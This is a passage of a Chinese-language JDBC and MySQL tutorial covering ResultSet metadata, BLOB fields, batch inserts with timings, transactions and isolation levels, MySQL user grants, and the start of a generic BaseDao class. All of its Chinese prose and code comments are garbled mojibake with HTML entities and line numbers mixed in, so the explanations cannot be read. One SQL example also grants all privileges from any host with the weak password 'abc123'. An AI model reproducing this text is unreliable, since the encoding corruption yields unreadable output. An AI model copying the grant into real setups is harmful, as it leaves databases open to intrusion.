ä½ç¬¦ for (int i = 0; i \u0026lt; args.length; i++) { ps.setObject(i + 1, args[i]); } // 4.æ‰§è¡ŒexecuteQuery(),å¾—åˆ°ç»“æœé›†ï¼šResultSet rs = ps.executeQuery(); // 5.å¾—åˆ°ç»“æœé›†çš„å…ƒæ•°æ®ï¼šResultSetMetaData ResultSetMetaData rsmd = rs.getMetaData(); // 6.1é€šè¿‡ResultSetMetaDataå¾—åˆ°columnCount,columnLabelï¼›é€šè¿‡ResultSetå¾—åˆ°åˆ—å€¼ int columnCount = rsmd.getColumnCount(); if (rs.next()) { T t = clazz.newInstance(); for (int i = 0; i \u0026lt; columnCount; i++) {// éå†æ¯ä¸€ä¸ªåˆ— // è·å–åˆ—å€¼ Object columnVal = rs.getObject(i + 1); // è·å–åˆ—çš„åˆ«å:åˆ—çš„åˆ«åï¼Œä½¿ç”¨ç±»çš„å±æ€§åå……å½“ String columnLabel = rsmd.getColumnLabel(i + 1); // 6.2ä½¿ç”¨åå°„ï¼Œç»™å¯¹è±¡çš„ç›¸åº”å±æ€§èµ‹å€¼ Field field = clazz.getDeclaredField(columnLabel); field.setAccessible(true); field.set(t, columnVal); } return t; } } catch (Exception e) { e.printStackTrace(); } finally { // 7.å…³é—­èµ„æº JDBCUtils.closeResource(conn, ps, rs); } return null; } 3.3 ResultSetä¸ResultSetMetaData 3.3.1 ResultSet æŸ¥è¯¢éœ€è¦è°ƒç”¨PreparedStatement çš„ executeQuery() æ–¹æ³•ï¼ŒæŸ¥è¯¢ç»“æœæ˜¯ä¸€ä¸ªResultSet å¯¹è±¡\nResultSet å¯¹è±¡ä»¥é€»è¾‘è¡¨æ ¼çš„å½¢å¼å°è£…äº†æ‰§è¡Œæ•°æ®åº“æ“ä½œçš„ç»“æœé›†ï¼ŒResultSet æ¥å£ç”±æ•°æ®åº“å‚å•†æä¾›å®ç°\nResultSet è¿”å›çš„å®é™…ä¸Šå°±æ˜¯ä¸€å¼ æ•°æ®è¡¨ã€‚æœ‰ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘æ•°æ®è¡¨çš„ç¬¬ä¸€æ¡è®°å½•çš„å‰é¢ã€‚\nResultSet å¯¹è±¡ç»´æŠ¤äº†ä¸€ä¸ªæŒ‡å‘å½“å‰æ•°æ®è¡Œçš„æ¸¸æ ‡ï¼Œåˆå§‹çš„æ—¶å€™ï¼Œæ¸¸æ ‡åœ¨ç¬¬ä¸€è¡Œä¹‹å‰ï¼Œå¯ä»¥é€šè¿‡ ResultSet å¯¹è±¡çš„ next() æ–¹æ³•ç§»åŠ¨åˆ°ä¸‹ä¸€è¡Œã€‚è°ƒç”¨ next()æ–¹æ³•æ£€æµ‹ä¸‹ä¸€è¡Œæ˜¯å¦æœ‰æ•ˆã€‚è‹¥æœ‰æ•ˆï¼Œè¯¥æ–¹æ³•è¿”å› trueï¼Œä¸”æŒ‡é’ˆä¸‹ç§»ã€‚ç›¸å½“äºIteratorå¯¹è±¡çš„ hasNext() å’Œ next() æ–¹æ³•çš„ç»“åˆä½“ã€‚\nå½“æŒ‡é’ˆæŒ‡å‘ä¸€è¡Œæ—¶, å¯ä»¥é€šè¿‡è°ƒç”¨ getXxx(int index) æˆ– getXxx(int columnName) è·å–æ¯ä¸€åˆ—çš„å€¼ã€‚\nä¾‹å¦‚: getInt(1), getString(\u0026ldquo;name\u0026rdquo;) æ³¨æ„ï¼šJavaä¸æ•°æ®åº“äº¤äº’æ¶‰åŠåˆ°çš„ç›¸å…³Java APIä¸­çš„ç´¢å¼•éƒ½ä»1å¼€å§‹ã€‚ ResultSet æ¥å£çš„å¸¸ç”¨æ–¹æ³•ï¼š\nboolean next() getString() 3.3.2 ResultSetMetaData å¯ç”¨äºè·å–å…³äº ResultSet å¯¹è±¡ä¸­åˆ—çš„ç±»å‹å’Œå±æ€§ä¿¡æ¯çš„å¯¹è±¡\nResultSetMetaData meta = rs.getMetaData();\ngetColumnName(int column)ï¼šè·å–æŒ‡å®šåˆ—çš„åç§°\ngetColumnLabel(int column)ï¼šè·å–æŒ‡å®šåˆ—çš„åˆ«å\ngetColumnCount()ï¼šè¿”å›å½“å‰ ResultSet å¯¹è±¡ä¸­çš„åˆ—æ•°ã€‚\ngetColumnTypeName(int column)ï¼šæ£€ç´¢æŒ‡å®šåˆ—çš„æ•°æ®åº“ç‰¹å®šçš„ç±»å‹åç§°ã€‚\ngetColumnDisplaySize(int column)ï¼šæŒ‡ç¤ºæŒ‡å®šåˆ—çš„æœ€å¤§æ ‡å‡†å®½åº¦ï¼Œä»¥å­—ç¬¦ä¸ºå•ä½ã€‚\nisNullable(int column)ï¼šæŒ‡ç¤ºæŒ‡å®šåˆ—ä¸­çš„å€¼æ˜¯å¦å¯ä»¥ä¸º nullã€‚\nisAutoIncrement(int column)ï¼šæŒ‡ç¤ºæ˜¯å¦è‡ªåŠ¨ä¸ºæŒ‡å®šåˆ—è¿›è¡Œç¼–å·ï¼Œè¿™æ ·è¿™äº›åˆ—ä»ç„¶æ˜¯åªè¯»çš„ã€‚\né—®é¢˜1ï¼šå¾—åˆ°ç»“æœé›†å, å¦‚ä½•çŸ¥é“è¯¥ç»“æœé›†ä¸­æœ‰å“ªäº›åˆ— ï¼Ÿ åˆ—åæ˜¯ä»€ä¹ˆï¼Ÿ\nâ€‹ éœ€è¦ä½¿ç”¨ä¸€ä¸ªæè¿° ResultSet çš„å¯¹è±¡ï¼Œ å³ ResultSetMetaData\né—®é¢˜2ï¼šå…³äºResultSetMetaData\nå¦‚ä½•è·å– ResultSetMetaDataï¼š è°ƒç”¨ ResultSet çš„ getMetaData() æ–¹æ³•å³å¯ è·å– ResultSet ä¸­æœ‰å¤šå°‘åˆ—ï¼šè°ƒç”¨ ResultSetMetaData çš„ getColumnCount() æ–¹æ³• è·å– ResultSet æ¯ä¸€åˆ—çš„åˆ—çš„åˆ«åæ˜¯ä»€ä¹ˆï¼šè°ƒç”¨ ResultSetMetaData çš„getColumnLabel() æ–¹æ³• 3.4 èµ„æºçš„é‡Šæ”¾ æ•°æ®åº“ç»“æŸåä¸€å®šè¦å…³é—­æ‰€æœ‰çš„è¿æ¥ 3.6 JDBC APIå°ç»“ ä¸¤ç§æ€æƒ³\né¢å‘æ¥å£ç¼–ç¨‹çš„æ€æƒ³ ORMæ€æƒ³(object relational mapping) ä¸€ä¸ªæ•°æ®è¡¨å¯¹åº”ä¸€ä¸ªjavaç±» è¡¨ä¸­çš„ä¸€æ¡è®°å½•å¯¹åº”javaç±»çš„ä¸€ä¸ªå¯¹è±¡ è¡¨ä¸­çš„ä¸€ä¸ªå­—æ®µå¯¹åº”javaç±»çš„ä¸€ä¸ªå±æ€§ sqlæ˜¯éœ€è¦ç»“åˆåˆ—åå’Œè¡¨çš„å±æ€§åæ¥å†™ã€‚æ³¨æ„èµ·åˆ«åã€‚\nä¸¤ç§æŠ€æœ¯\nJDBCç»“æœé›†çš„å…ƒæ•°æ®ï¼šResultSetMetaData è·å–åˆ—æ•°ï¼šgetColumnCount() è·å–åˆ—çš„åˆ«åï¼šgetColumnLabel() é€šè¿‡åå°„ï¼Œåˆ›å»ºæŒ‡å®šç±»çš„å¯¹è±¡ï¼Œè·å–æŒ‡å®šçš„å±æ€§å¹¶èµ‹å€¼ å››ï¼š æ“ä½œBLOBç±»å‹å­—æ®µ 4.1 MySQL BLOBç±»å‹ MySQLä¸­ï¼ŒBLOBæ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶å¤§å‹å¯¹è±¡ï¼Œæ˜¯ä¸€ä¸ªå¯ä»¥å­˜å‚¨å¤§é‡æ•°æ®çš„å®¹å™¨ï¼Œå®ƒèƒ½å®¹çº³ä¸åŒå¤§å°çš„æ•°æ®ã€‚\næ’å…¥BLOBç±»å‹çš„æ•°æ®å¿…é¡»ä½¿ç”¨PreparedStatementï¼Œå› ä¸ºBLOBç±»å‹çš„æ•°æ®æ— æ³•ä½¿ç”¨å­—ç¬¦ä¸²æ‹¼æ¥å†™çš„ã€‚\nMySQLçš„å››ç§BLOBç±»å‹(é™¤äº†åœ¨å­˜å‚¨çš„æœ€å¤§ä¿¡æ¯é‡ä¸Šä¸åŒå¤–ï¼Œä»–ä»¬æ˜¯ç­‰åŒçš„)\nå¦‚æœåœ¨æŒ‡å®šäº†ç›¸å…³çš„Blobç±»å‹ä»¥åï¼Œè¿˜æŠ¥é”™ï¼šxxx too largeï¼Œé‚£ä¹ˆåœ¨mysqlçš„å®‰è£…ç›®å½•ä¸‹ï¼Œæ‰¾my.iniæ–‡ä»¶åŠ ä¸Šå¦‚ä¸‹çš„é…ç½®å‚æ•°ï¼š max_allowed_packet=16Mã€‚åŒæ—¶æ³¨æ„ï¼šä¿®æ”¹äº†my.iniæ–‡ä»¶ä¹‹åï¼Œéœ€è¦é‡æ–°å¯åŠ¨mysqlæœåŠ¡ã€‚ 4.2 å‘æ•°æ®è¡¨ä¸­æ’å…¥å¤§æ•°æ®ç±»å‹ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 //è·å–è¿æ¥ Connection conn = JDBCUtils.getConnection(); String sql = \u0026#34;insert into customers(name,email,birth,photo)values(?,?,?,?)\u0026#34;; PreparedStatement ps = conn.prepareStatement(sql); // å¡«å……å ä½ç¬¦ ps.setString(1, \u0026#34;å¾æµ·å¼º\u0026#34;); ps.setString(2, \u0026#34;xhq@126.com\u0026#34;); ps.setDate(3, new Date(new java.util.Date().getTime())); // æ“ä½œBlobç±»å‹çš„å˜é‡ FileInputStream fis = new FileInputStream(\u0026#34;xhq.png\u0026#34;); ps.setBlob(4, fis); //æ‰§è¡Œ ps.execute(); fis.close(); JDBCUtils.closeResource(conn, ps); 4.3 ä¿®æ”¹æ•°æ®è¡¨ä¸­çš„Blobç±»å‹å­—æ®µ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 Connection conn = JDBCUtils.getConnection(); String sql = \u0026#34;update customers set photo = ? where id = ?\u0026#34;; PreparedStatement ps = conn.prepareStatement(sql); // å¡«å……å ä½ç¬¦ // æ“ä½œBlobç±»å‹çš„å˜é‡ FileInputStream fis = new FileInputStream(\u0026#34;coffee.png\u0026#34;); ps.setBlob(1, fis); ps.setInt(2, 25); ps.execute(); fis.close(); JDBCUtils.closeResource(conn, ps); 4.4 ä»æ•°æ®è¡¨ä¸­è¯»å–å¤§æ•°æ®ç±»å‹ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 String sql = \u0026#34;SELECT id, name, email, birth, photo FROM customer WHERE id = ?\u0026#34;; conn = getConnection(); ps = conn.prepareStatement(sql); ps.setInt(1, 8); rs = ps.executeQuery(); if(rs.next()){ Integer id = rs.getInt(1); String name = rs.getString(2); String email = rs.getString(3); Date birth = rs.getDate(4); Customer cust = new Customer(id, name, email, birth); System.out.println(cust); //è¯»å–Blobç±»å‹çš„å­—æ®µ Blob photo = rs.getBlob(5); InputStream is = photo.getBinaryStream(); OutputStream os = new FileOutputStream(\u0026#34;c.jpg\u0026#34;); byte [] buffer = new byte[1024]; int len = 0; while((len = is.read(buffer)) != -1){ os.write(buffer, 0, len); } JDBCUtils.closeResource(conn, ps, rs); if(is != null){ is.close(); } if(os != null){ os.close(); } } äº”ï¼š æ‰¹é‡æ’å…¥ 5.1 æ‰¹é‡æ‰§è¡ŒSQLè¯­å¥ å½“éœ€è¦æˆæ‰¹æ’å…¥æˆ–è€…æ›´æ–°è®°å½•æ—¶ï¼Œå¯ä»¥é‡‡ç”¨Javaçš„æ‰¹é‡æ›´æ–°æœºåˆ¶ï¼Œè¿™ä¸€æœºåˆ¶å…è®¸å¤šæ¡è¯­å¥ä¸€æ¬¡æ€§æäº¤ç»™æ•°æ®åº“æ‰¹é‡å¤„ç†ã€‚é€šå¸¸æƒ…å†µä¸‹æ¯”å•ç‹¬æäº¤å¤„ç†æ›´æœ‰æ•ˆç‡\nJDBCçš„æ‰¹é‡å¤„ç†è¯­å¥åŒ…æ‹¬ä¸‹é¢ä¸‰ä¸ªæ–¹æ³•ï¼š\naddBatch(String)ï¼šæ·»åŠ éœ€è¦æ‰¹é‡å¤„ç†çš„SQLè¯­å¥æˆ–æ˜¯å‚æ•°ï¼› executeBatch()ï¼šæ‰§è¡Œæ‰¹é‡å¤„ç†è¯­å¥ï¼› clearBatch():æ¸…ç©ºç¼“å­˜çš„æ•°æ® é€šå¸¸æˆ‘ä»¬ä¼šé‡åˆ°ä¸¤ç§æ‰¹é‡æ‰§è¡ŒSQLè¯­å¥çš„æƒ…å†µï¼š\nå¤šæ¡SQLè¯­å¥çš„æ‰¹é‡å¤„ç†ï¼› ä¸€ä¸ªSQLè¯­å¥çš„æ‰¹é‡ä¼ å‚ï¼› 5.2 é«˜æ•ˆçš„æ‰¹é‡æ’å…¥ ä¸¾ä¾‹ï¼šå‘æ•°æ®è¡¨ä¸­æ’å…¥20000æ¡æ•°æ® 5.2.1 å®ç°å±‚æ¬¡ä¸€ï¼šä½¿ç”¨Statement 1 2 3 4 5 6 Connection conn = JDBCUtils.getConnection(); Statement st = conn.createStatement(); for(int i = 1;i \u0026lt;= 20000;i++){ String sql = \u0026#34;insert into goods(name) values(\u0026#39;name_\u0026#39; + \u0026#34;+ i +\u0026#34;)\u0026#34;; st.executeUpdate(sql); } 5.2.2 å®ç°å±‚æ¬¡äºŒï¼šä½¿ç”¨PreparedStatement 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 long start = System.currentTimeMillis(); Connection conn = JDBCUtils.getConnection(); String sql = \u0026#34;insert into goods(name)values(?)\u0026#34;; PreparedStatement ps = conn.prepareStatement(sql); for(int i = 1;i \u0026lt;= 20000;i++){ ps.setString(1, \u0026#34;name_\u0026#34; + i); ps.executeUpdate(); } long end = System.currentTimeMillis(); System.out.println(\u0026#34;èŠ±è´¹çš„æ—¶é—´ä¸ºï¼š\u0026#34; + (end - start));//82340 JDBCUtils.closeResource(conn, ps); æ³•äºŒæ¯”æ³•ä¸€å¿«çš„åŸå› æ˜¯ï¼šPrepareStatementå¯ä»¥ç»™sqlæå‰é¢„å¤‡å¥½ï¼Œå®é™…ä¸Šï¼Œsqlåªéœ€è¦æ‹¼æ¥ä¸€æ¬¡ï¼Œè€Œstatementéœ€è¦æ‹¼æ¥å¤šæ¬¡ã€‚ 5.2.3 å®ç°å±‚æ¬¡ä¸‰ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 /* * ä¿®æ”¹1ï¼š ä½¿ç”¨ addBatch() / executeBatch() / clearBatch() * ä¿®æ”¹2ï¼šmysqlæœåŠ¡å™¨é»˜è®¤æ˜¯å…³é—­æ‰¹å¤„ç†çš„ï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡ä¸€ä¸ªå‚æ•°ï¼Œè®©mysqlå¼€å¯æ‰¹å¤„ç†çš„æ”¯æŒã€‚ * ?rewriteBatchedStatements=true å†™åœ¨é…ç½®æ–‡ä»¶çš„urlåé¢ * ä¿®æ”¹3ï¼šä½¿ç”¨æ›´æ–°çš„mysql é©±åŠ¨ï¼šmysql-connector-java-5.1.37-bin.jar * */ @Test public void testInsert1() throws Exception{ long start = System.currentTimeMillis(); Connection conn = JDBCUtils.getConnection(); String sql = \u0026#34;insert into goods(name)values(?)\u0026#34;; PreparedStatement ps = conn.prepareStatement(sql); for(int i = 1;i \u0026lt;= 1000000;i++){ ps.setString(1, \u0026#34;name_\u0026#34; + i); //1.â€œæ”’â€sql ps.addBatch(); if(i % 500 == 0){ //2.æ‰§è¡Œ ps.executeBatch(); //3.æ¸…ç©º ps.clearBatch(); } } long end = System.currentTimeMillis(); System.out.println(\u0026#34;èŠ±è´¹çš„æ—¶é—´ä¸ºï¼š\u0026#34; + (end - start));//20000æ¡ï¼š625 //1000000æ¡:14733 JDBCUtils.closeResource(conn, ps); } æ³•ä¸‰æ˜¯åˆ©ç”¨Batch,ç›¸å½“äºä¸€ä¸ªæ± å­ï¼Œå½“ç§¯ç´¯çš„è¯·æ±‚è¾¾åˆ°ä¸€å®šç¨‹åº¦çš„æ—¶å€™ï¼Œé›†ä¸­è¿›è¡Œæ‰§è¡Œã€‚ 5.2.4 å®ç°å±‚æ¬¡å›› 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 /* * å±‚æ¬¡å››ï¼šåœ¨å±‚æ¬¡ä¸‰çš„åŸºç¡€ä¸Šæ“ä½œ * ä½¿ç”¨Connection çš„ setAutoCommit(false) / commit() */ @Test public void testInsert2() throws Exception{ long start = System.currentTimeMillis(); Connection conn = JDBCUtils.getConnection(); //1.è®¾ç½®ä¸ºä¸è‡ªåŠ¨æäº¤æ•°æ® conn.setAutoCommit(false); String sql = \u0026#34;insert into goods(name)values(?)\u0026#34;; PreparedStatement ps = conn.prepareStatement(sql); for(int i = 1;i \u0026lt;= 1000000;i++){ ps.setString(1, \u0026#34;name_\u0026#34; + i); //1.â€œæ”’â€sql ps.addBatch(); if(i % 500 == 0){ //2.æ‰§è¡Œ ps.executeBatch(); //3.æ¸…ç©º ps.clearBatch(); } } //2.æäº¤æ•°æ® conn.commit(); long end = System.currentTimeMillis(); System.out.println(\u0026#34;èŠ±è´¹çš„æ—¶é—´ä¸ºï¼š\u0026#34; + (end - start));//1000000æ¡:4978 JDBCUtils.closeResource(conn, ps); } æ³•å›› ç›¸æ¯”è¾ƒæ³•ä¸‰ï¼Œ åªéœ€è¦æäº¤ä¸€æ¬¡ã€‚io è¯·æ±‚å‡å°‘ã€‚ å…­ï¼š æ•°æ®åº“äº‹åŠ¡ 6.1 æ•°æ®åº“äº‹åŠ¡ä»‹ç» äº‹åŠ¡ï¼šä¸€ç»„é€»è¾‘æ“ä½œå•å…ƒ,ä½¿æ•°æ®ä»ä¸€ç§çŠ¶æ€å˜æ¢åˆ°å¦ä¸€ç§çŠ¶æ€ã€‚\näº‹åŠ¡å¤„ç†ï¼ˆäº‹åŠ¡æ“ä½œï¼‰ï¼šä¿è¯æ‰€æœ‰äº‹åŠ¡éƒ½ä½œä¸ºä¸€ä¸ªå·¥ä½œå•å…ƒæ¥æ‰§è¡Œï¼Œå³ä½¿å‡ºç°äº†æ•…éšœï¼Œéƒ½ä¸èƒ½æ”¹å˜è¿™ç§æ‰§è¡Œæ–¹å¼ã€‚å½“åœ¨ä¸€ä¸ªäº‹åŠ¡ä¸­æ‰§è¡Œå¤šä¸ªæ“ä½œæ—¶ï¼Œè¦ä¹ˆæ‰€æœ‰çš„äº‹åŠ¡éƒ½è¢«æäº¤(commit)ï¼Œé‚£ä¹ˆè¿™äº›ä¿®æ”¹å°±æ°¸ä¹…åœ°ä¿å­˜ä¸‹æ¥ï¼›è¦ä¹ˆæ•°æ®åº“ç®¡ç†ç³»ç»Ÿå°†æ”¾å¼ƒæ‰€ä½œçš„æ‰€æœ‰ä¿®æ”¹ï¼Œæ•´ä¸ªäº‹åŠ¡**å›æ»š(rollback)**åˆ°æœ€åˆçŠ¶æ€ã€‚\nä¸ºç¡®ä¿æ•°æ®åº“ä¸­æ•°æ®çš„ä¸€è‡´æ€§ï¼Œæ•°æ®çš„æ“çºµåº”å½“æ˜¯ç¦»æ•£çš„æˆç»„çš„é€»è¾‘å•å…ƒï¼šå½“å®ƒå…¨éƒ¨å®Œæˆæ—¶ï¼Œæ•°æ®çš„ä¸€è‡´æ€§å¯ä»¥ä¿æŒï¼Œè€Œå½“è¿™ä¸ªå•å…ƒä¸­çš„ä¸€éƒ¨åˆ†æ“ä½œå¤±è´¥ï¼Œæ•´ä¸ªäº‹åŠ¡åº”å…¨éƒ¨è§†ä¸ºé”™è¯¯ï¼Œæ‰€æœ‰ä»èµ·å§‹ç‚¹ä»¥åçš„æ“ä½œåº”å…¨éƒ¨å›é€€åˆ°å¼€å§‹çŠ¶æ€ã€‚\n6.2 äº‹åŠ¡çš„ACIDå±æ€§ åŸå­æ€§ï¼ˆAtomicityï¼‰ åŸå­æ€§æ˜¯æŒ‡äº‹åŠ¡æ˜¯ä¸€ä¸ªä¸å¯åˆ†å‰²çš„å·¥ä½œå•ä½ï¼Œäº‹åŠ¡ä¸­çš„æ“ä½œè¦ä¹ˆéƒ½å‘ç”Ÿï¼Œè¦ä¹ˆéƒ½ä¸å‘ç”Ÿã€‚\nä¸€è‡´æ€§ï¼ˆConsistencyï¼‰ äº‹åŠ¡å¿…é¡»ä½¿æ•°æ®åº“ä»ä¸€ä¸ªä¸€è‡´æ€§çŠ¶æ€å˜æ¢åˆ°å¦å¤–ä¸€ä¸ªä¸€è‡´æ€§çŠ¶æ€ã€‚\néš”ç¦»æ€§ï¼ˆIsolationï¼‰ äº‹åŠ¡çš„éš”ç¦»æ€§æ˜¯æŒ‡ä¸€ä¸ªäº‹åŠ¡çš„æ‰§è¡Œä¸èƒ½è¢«å…¶ä»–äº‹åŠ¡å¹²æ‰°ï¼Œå³ä¸€ä¸ªäº‹åŠ¡å†…éƒ¨çš„æ“ä½œåŠä½¿ç”¨çš„æ•°æ®å¯¹å¹¶å‘çš„å…¶ä»–äº‹åŠ¡æ˜¯éš”ç¦»çš„ï¼Œå¹¶å‘æ‰§è¡Œçš„å„ä¸ªäº‹åŠ¡ä¹‹é—´ä¸èƒ½äº’ç›¸å¹²æ‰°ã€‚\næŒä¹…æ€§ï¼ˆDurabilityï¼‰ æŒä¹…æ€§æ˜¯æŒ‡ä¸€ä¸ªäº‹åŠ¡ä¸€æ—¦è¢«æäº¤ï¼Œå®ƒå¯¹æ•°æ®åº“ä¸­æ•°æ®çš„æ”¹å˜å°±æ˜¯æ°¸ä¹…æ€§çš„ï¼Œæ¥ä¸‹æ¥çš„å…¶ä»–æ“ä½œå’Œæ•°æ®åº“æ•…éšœä¸åº”è¯¥å¯¹å…¶æœ‰ä»»ä½•å½±å“ã€‚\n6.3.1 æ•°æ®åº“çš„å¹¶å‘é—®é¢˜ å¯¹äºåŒæ—¶è¿è¡Œçš„å¤šä¸ªäº‹åŠ¡, å½“è¿™äº›äº‹åŠ¡è®¿é—®æ•°æ®åº“ä¸­ç›¸åŒçš„æ•°æ®æ—¶, å¦‚æœæ²¡æœ‰é‡‡å–å¿…è¦çš„éš”ç¦»æœºåˆ¶, å°±ä¼šå¯¼è‡´å„ç§å¹¶å‘é—®é¢˜:\nè„è¯»: å¯¹äºä¸¤ä¸ªäº‹åŠ¡ T1, T2, T1 è¯»å–äº†å·²ç»è¢« T2 æ›´æ–°ä½†è¿˜æ²¡æœ‰è¢«æäº¤çš„å­—æ®µã€‚ä¹‹å, è‹¥ T2 å›æ»š, T1è¯»å–çš„å†…å®¹å°±æ˜¯ä¸´æ—¶ä¸”æ— æ•ˆçš„ã€‚ ä¸å¯é‡å¤è¯»: å¯¹äºä¸¤ä¸ªäº‹åŠ¡T1, T2, T1 è¯»å–äº†ä¸€ä¸ªå­—æ®µ, ç„¶å T2 æ›´æ–°äº†è¯¥å­—æ®µã€‚ä¹‹å, T1å†æ¬¡è¯»å–åŒä¸€ä¸ªå­—æ®µ, å€¼å°±ä¸åŒäº†ã€‚ å¹»è¯»: å¯¹äºä¸¤ä¸ªäº‹åŠ¡T1, T2, T1 ä»ä¸€ä¸ªè¡¨ä¸­è¯»å–äº†ä¸€ä¸ªå­—æ®µ, ç„¶å T2 åœ¨è¯¥è¡¨ä¸­æ’å…¥äº†ä¸€äº›æ–°çš„è¡Œã€‚ä¹‹å, å¦‚æœ T1 å†æ¬¡è¯»å–åŒä¸€ä¸ªè¡¨, å°±ä¼šå¤šå‡ºå‡ è¡Œã€‚ æ•°æ®åº“äº‹åŠ¡çš„éš”ç¦»æ€§: æ•°æ®åº“ç³»ç»Ÿå¿…é¡»å…·æœ‰éš”ç¦»å¹¶å‘è¿è¡Œå„ä¸ªäº‹åŠ¡çš„èƒ½åŠ›, ä½¿å®ƒä»¬ä¸ä¼šç›¸äº’å½±å“, é¿å…å„ç§å¹¶å‘é—®é¢˜ã€‚\nä¸€ä¸ªäº‹åŠ¡ä¸å…¶ä»–äº‹åŠ¡éš”ç¦»çš„ç¨‹åº¦ç§°ä¸ºéš”ç¦»çº§åˆ«ã€‚æ•°æ®åº“è§„å®šäº†å¤šç§äº‹åŠ¡éš”ç¦»çº§åˆ«, ä¸åŒéš”ç¦»çº§åˆ«å¯¹åº”ä¸åŒçš„å¹²æ‰°ç¨‹åº¦, éš”ç¦»çº§åˆ«è¶Šé«˜, æ•°æ®ä¸€è‡´æ€§å°±è¶Šå¥½, ä½†å¹¶å‘æ€§è¶Šå¼±ã€‚\n6.3.2 å››ç§éš”ç¦»çº§åˆ« æ•°æ®åº“æä¾›çš„4ç§äº‹åŠ¡éš”ç¦»çº§åˆ«ï¼š\nOracle æ”¯æŒçš„ 2 ç§äº‹åŠ¡éš”ç¦»çº§åˆ«ï¼šREAD COMMITED, SERIALIZABLEã€‚ Oracle é»˜è®¤çš„äº‹åŠ¡éš”ç¦»çº§åˆ«ä¸º: READ COMMITED ã€‚\nMysql æ”¯æŒ 4 ç§äº‹åŠ¡éš”ç¦»çº§åˆ«ã€‚Mysql é»˜è®¤çš„äº‹åŠ¡éš”ç¦»çº§åˆ«ä¸º: REPEATABLE READã€‚\n6.3.3 åœ¨MySqlä¸­è®¾ç½®éš”ç¦»çº§åˆ« æ¯å¯åŠ¨ä¸€ä¸ª mysql ç¨‹åº, å°±ä¼šè·å¾—ä¸€ä¸ªå•ç‹¬çš„æ•°æ®åº“è¿æ¥. æ¯ä¸ªæ•°æ®åº“è¿æ¥éƒ½æœ‰ä¸€ä¸ªå…¨å±€å˜é‡ @@tx_isolation, è¡¨ç¤ºå½“å‰çš„äº‹åŠ¡éš”ç¦»çº§åˆ«ã€‚\næŸ¥çœ‹å½“å‰çš„éš”ç¦»çº§åˆ«:\n1 SELECT @@tx_isolation; è®¾ç½®å½“å‰ mySQL è¿æ¥çš„éš”ç¦»çº§åˆ«:\n1 set transaction isolation level read committed; è®¾ç½®æ•°æ®åº“ç³»ç»Ÿçš„å…¨å±€çš„éš”ç¦»çº§åˆ«:\n1 set global transaction isolation level read committed; è¡¥å……æ“ä½œï¼š\nåˆ›å»ºmysqlæ•°æ®åº“ç”¨æˆ·ï¼š\n1 create user tom identified by \u0026#39;abc123\u0026#39;; æˆäºˆæƒé™\n1 2 3 4 5 #æˆäºˆé€šè¿‡ç½‘ç»œæ–¹å¼ç™»å½•çš„tomç”¨æˆ·ï¼Œå¯¹æ‰€æœ‰åº“æ‰€æœ‰è¡¨çš„å…¨éƒ¨æƒé™ï¼Œå¯†ç è®¾ä¸ºabc123. grant all privileges on *.* to tom@\u0026#39;%\u0026#39; identified by \u0026#39;abc123\u0026#39;; #ç»™tomç”¨æˆ·ä½¿ç”¨æœ¬åœ°å‘½ä»¤è¡Œæ–¹å¼ï¼Œæˆäºˆatguigudbè¿™ä¸ªåº“ä¸‹çš„æ‰€æœ‰è¡¨çš„æ’åˆ æ”¹æŸ¥çš„æƒé™ã€‚ grant select,insert,delete,update on atguigudb.* to tom@localhost identified by \u0026#39;abc123\u0026#39;; ä¸ƒï¼šDAOåŠç›¸å…³å®ç°ç±» DAOï¼šData Access Objectè®¿é—®æ•°æ®ä¿¡æ¯çš„ç±»å’Œæ¥å£ï¼ŒåŒ…æ‹¬äº†å¯¹æ•°æ®çš„CRUDï¼ˆCreateã€Retrivalã€Updateã€Deleteï¼‰ï¼Œè€Œä¸åŒ…å«ä»»ä½•ä¸šåŠ¡ç›¸å…³çš„ä¿¡æ¯ã€‚æœ‰æ—¶ä¹Ÿç§°ä½œï¼šBaseDAO ä½œç”¨ï¼šä¸ºäº†å®ç°åŠŸèƒ½çš„æ¨¡å—åŒ–ï¼Œæ›´æœ‰åˆ©äºä»£ç çš„ç»´æŠ¤å’Œå‡çº§ã€‚ ã€BaseDAO.javaã€‘ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 package com.atguigu.bookstore.dao; import java.lang.reflect.ParameterizedType; import java.lang.reflect.Type; import java.sql.Connection; import java.sql.SQLException; import java.util.List; import org.apache.commons.dbutils.QueryRunner; import org.apache.commons.dbutils.handlers.BeanHandler; import org.apache.commons.dbutils.handlers.BeanListHandler; import org.apache.commons.dbutils.handlers.ScalarHandler; /** * å®šä¹‰ä¸€ä¸ªç”¨æ¥è¢«ç»§æ‰¿çš„å¯¹æ•°æ®åº“è¿›è¡ŒåŸºæœ¬æ“ä½œçš„Dao * * @author HanYanBing * * @param \u0026lt;T\u0026gt; */ public abstract class BaseDao\u0026lt;T\u0026gt; { private QueryRunner queryRunner = new QueryRunner(); // å®šä¹‰ä¸€ä¸ªå˜é‡æ¥æ¥æ”¶æ³›å‹çš„ç±»å‹ private Class\u0026lt;T\u0026gt; type; // è·å–Tçš„Classå¯¹è±¡ï¼Œè·å–æ³›å‹çš„ç±»å‹ï¼Œæ³›å‹æ˜¯åœ¨è¢«å­ç±»ç»§æ‰¿æ—¶æ‰ç¡®å®š public BaseDao() { // è·å–å­ç±»çš„ç±»å‹ Class clazz = this.getClass(); // è·å–çˆ¶ç±»çš„ç±»å‹ // getGenericSuperclass()ç”¨æ¥è·å–å½“å‰ç±»çš„çˆ¶ç±»çš„ç±»å‹ // 